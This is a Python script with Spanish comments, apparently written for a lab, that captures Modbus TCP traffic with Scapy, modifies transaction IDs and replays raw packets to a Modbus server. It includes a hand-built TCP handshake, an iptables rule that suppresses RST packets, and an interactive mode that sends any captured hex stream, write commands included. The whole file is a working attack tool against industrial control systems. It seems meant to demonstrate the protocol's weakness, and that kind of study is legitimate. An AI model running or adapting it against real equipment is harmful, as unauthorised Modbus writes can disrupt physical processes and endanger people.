#!/usr/bin/env python3
"""
Modbus Packet Replay Tool - Para ejecutar en Kali (192.168.1.64)

Herramienta para capturar, modificar y reproducir paquetes Modbus.
Demuestra ataques de replay contra el protocolo Modbus TCP.

IMPORTANTE: Antes de ejecutar, deshabilitar RST automatico:
    sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.64 -j DROP

Uso:
    sudo python3 Modbus_replay.py
"""

from scapy.all import *
import struct
import random
import sys
import binascii

# ============================================
# CONFIGURACION
# ============================================
SRC_IP = '192.168.1.64'      # IP de Kali (atacante)
DST_IP = '192.168.1.66'      # IP de Ubuntu (servidor Modbus)
DST_PORT = 502

# Variables de sesion
src_port = random.randint(1024, 65535)
seq_nr = random.randint(444, 8765432)
ack_nr = 0

# ============================================
# FUNCIONES DE CAPTURA
# ============================================

def capture_modbus_packets(count=10, timeout=30):
    """Captura paquetes Modbus de la red"""
    print(f"[*] Capturando {count} paquetes Modbus (timeout: {timeout}s)...")
    print(f"[*] Filtro: tcp port 502")
    print("[*] Genera trafico Modbus en otra terminal para capturar...")

    packets = sniff(
        filter=f"tcp port {DST_PORT}",
        count=count,
        timeout=timeout
    )

    print(f"[+] Capturados {len(packets)} paquetes")
    return packets

def analyze_packet(pkt):
    """Analiza un paquete Modbus capturado"""
    if Raw not in pkt:
        return None

    data = bytes(pkt[Raw].load)

    if len(data) < 8:
        return None

    analysis = {
        'src_ip': pkt[IP].src,
        'dst_ip': pkt[IP].dst,
        'src_port': pkt[TCP].sport,
        'dst_port': pkt[TCP].dport,
        'trans_id': struct.unpack('>H', data[0:2])[0],
        'proto_id': struct.unpack('>H', data[2:4])[0],
        'length': struct.unpack('>H', data[4:6])[0],
        'unit_id': data[6],
        'func_code': data[7],
        'raw_data': data,
        'hex_stream': data.hex()
    }

    return analysis

def print_packet_analysis(analysis):
    """Imprime analisis de paquete"""
    func_codes = {
        0x01: "Read Coils",
        0x02: "Read Discrete Inputs",
        0x03: "Read Holding Registers",
        0x04: "Read Input Registers",
        0x05: "Write Single Coil",
        0x06: "Write Single Register",
        0x0F: "Write Multiple Coils",
        0x10: "Write Multiple Registers",
        0x11: "Report Slave ID",
        0x2B: "Read Device Identification"
    }

    fc_name = func_codes.get(analysis['func_code'], "Unknown")

    print(f"  Src: {analysis['src_ip']}:{analysis['src_port']}")
    print(f"  Dst: {analysis['dst_ip']}:{analysis['dst_port']}")
    print(f"  Transaction ID: {analysis['trans_id']}")
    print(f"  Unit ID: {analysis['unit_id']}")
    print(f"  Function Code: 0x{analysis['func_code']:02X} ({fc_name})")
    print(f"  Hex Stream: {analysis['hex_stream']}")

# ============================================
# FUNCIONES TCP
# ============================================

def tcp_handshake():
    """Establece conexion TCP"""
    global seq_nr, ack_nr

    ip = IP(src=SRC_IP, dst=DST_IP)
    syn = TCP(sport=src_port, dport=DST_PORT, flags='S', seq=seq_nr)

    print(f"[*] Estableciendo conexion TCP con {DST_IP}:{DST_PORT}...")
    syn_ack = sr1(ip/syn, timeout=5, verbose=0)

    if syn_ack is None or syn_ack[TCP].flags != 'SA':
        print("[-] ERROR: No se pudo establecer conexion")
        return False

    ack_nr = syn_ack[TCP].seq + 1
    seq_nr = seq_nr + 1

    ack = TCP(sport=src_port, dport=DST_PORT, flags='A', seq=seq_nr, ack=ack_nr)
    send(ip/ack, verbose=0)

    print("[+] Conexion TCP establecida")
    return True

def send_raw_modbus(modbus_data):
    """Envia datos Modbus raw"""
    global seq_nr, ack_nr

    ip = IP(src=SRC_IP, dst=DST_IP)
    tcp = TCP(sport=src_port, dport=DST_PORT, flags='PA', seq=seq_nr, ack=ack_nr)

    response = sr1(ip/tcp/Raw(load=modbus_data), timeout=5, verbose=0)

    if response and Raw in response:
        seq_nr = seq_nr + len(modbus_data)
        ack_nr = response[TCP].seq + len(response[Raw].load)

        # ACK
        ack = TCP(sport=src_port, dport=DST_PORT, flags='A', seq=seq_nr, ack=ack_nr)
        send(ip/ack, verbose=0)

        return bytes(response[Raw].load)

    return None

def close_connection():
    """Cierra conexion TCP"""
    ip = IP(src=SRC_IP, dst=DST_IP)
    rst = TCP(sport=src_port, dport=DST_PORT, flags='RA', seq=seq_nr, ack=ack_nr)
    send(ip/rst, verbose=0)
    print("[*] Conexion cerrada")

# ============================================
# FUNCIONES DE REPLAY
# ============================================

def modify_and_replay(original_data, new_trans_id=None, new_unit_id=None):
    """Modifica y reenvia un paquete Modbus"""
    data = bytearray(original_data)

    # Modificar Transaction ID
    if new_trans_id is not None:
        data[0:2] = struct.pack('>H', new_trans_id)

    # Modificar Unit ID
    if new_unit_id is not None:
        data[6] = new_unit_id

    return bytes(data)

def replay_from_hex(hex_string):
    """Reproduce un paquete desde hex stream"""
    try:
        data = binascii.unhexlify(hex_string.replace(' ', '').replace('\n', ''))
        return data
    except Exception as e:
        print(f"[-] Error parseando hex: {e}")
        return None

# ============================================
# DEMO INTERACTIVO
# ============================================

def demo_replay():
    """Demostracion de ataque de replay"""
    print("=" * 60)
    print("MODBUS REPLAY ATTACK DEMONSTRATION")
    print("=" * 60)

    # Paquete de ejemplo: Read Holding Registers
    # MBAP Header + PDU para leer 5 registros desde direccion 0
    original_packet = bytes([
        0x00, 0x01,  # Transaction ID: 1
        0x00, 0x00,  # Protocol ID: 0
        0x00, 0x06,  # Length: 6
        0x01,        # Unit ID: 1
        0x03,        # Function Code: Read Holding Registers
        0x00, 0x00,  # Starting Address: 0
        0x00, 0x05   # Quantity: 5
    ])

    print("\n[*] Paquete original (Read Holding Registers):")
    print(f"    Hex: {original_packet.hex()}")

    # Establecer conexion
    if not tcp_handshake():
        return

    # Enviar paquete original
    print("\n[*] Enviando paquete original...")
    response = send_raw_modbus(original_packet)

    if response:
        print(f"[+] Respuesta recibida: {response.hex()}")

    # Modificar y reenviar
    print("\n[*] Modificando paquete (nuevo Transaction ID: 9999)...")
    modified_packet = modify_and_replay(original_packet, new_trans_id=9999)
    print(f"    Hex modificado: {modified_packet.hex()}")

    print("\n[*] Reenviando paquete modificado...")
    response = send_raw_modbus(modified_packet)

    if response:
        print(f"[+] Respuesta recibida: {response.hex()}")
        print("\n[!] ATAQUE DE REPLAY EXITOSO")
        print("    El servidor acepto el paquete modificado sin validacion")

    close_connection()

def interactive_mode():
    """Modo interactivo para replay"""
    print("=" * 60)
    print("MODO INTERACTIVO - REPLAY DE PAQUETES MODBUS")
    print("=" * 60)
    print("Ingrese un hex stream capturado de Wireshark")
    print("(Solo la parte Modbus/TCP, sin Ethernet/IP/TCP headers)")
    print("Ejemplo: 000100000006010300000005")
    print("Escriba 'exit' para salir")
    print("=" * 60)

    while True:
        hex_input = input("\n[>] Hex stream: ").strip()

        if hex_input.lower() == 'exit':
            break

        if not hex_input:
            continue

        data = replay_from_hex(hex_input)
        if data is None:
            continue

        print(f"\n[*] Paquete parseado ({len(data)} bytes)")

        if len(data) >= 8:
            analysis = {
                'trans_id': struct.unpack('>H', data[0:2])[0],
                'unit_id': data[6],
                'func_code': data[7]
            }
            print(f"    Transaction ID: {analysis['trans_id']}")
            print(f"    Unit ID: {analysis['unit_id']}")
            print(f"    Function Code: 0x{analysis['func_code']:02X}")

        modify = input("[?] Modificar Transaction ID? (s/n): ").strip().lower()
        if modify == 's':
            try:
                new_id = int(input("    Nuevo Transaction ID: "))
                data = modify_and_replay(data, new_trans_id=new_id)
                print(f"    Modificado: {data.hex()}")
            except ValueError:
                print("    ID invalido, usando original")

        send_pkt = input("[?] Enviar paquete? (s/n): ").strip().lower()
        if send_pkt == 's':
            if tcp_handshake():
                response = send_raw_modbus(data)
                if response:
                    print(f"[+] Respuesta: {response.hex()}")
                else:
                    print("[-] Sin respuesta")
                close_connection()

# ============================================
# MAIN
# ============================================

def main():
    print("\nSeleccione modo:")
    print("1. Demo automatico de replay")
    print("2. Modo interactivo (ingresar hex)")
    print("3. Capturar paquetes de la red")

    choice = input("\nOpcion [1-3]: ").strip()

    if choice == '1':
        demo_replay()
    elif choice == '2':
        interactive_mode()
    elif choice == '3':
        packets = capture_modbus_packets(count=5, timeout=60)
        print("\n[*] Analizando paquetes capturados:")
        for i, pkt in enumerate(packets):
            if TCP in pkt and Raw in pkt:
                print(f"\n--- Paquete {i+1} ---")
                analysis = analyze_packet(pkt)
                if analysis:
                    print_packet_analysis(analysis)
    else:
        print("Opcion invalida")

if __name__ == "__main__":
    main()
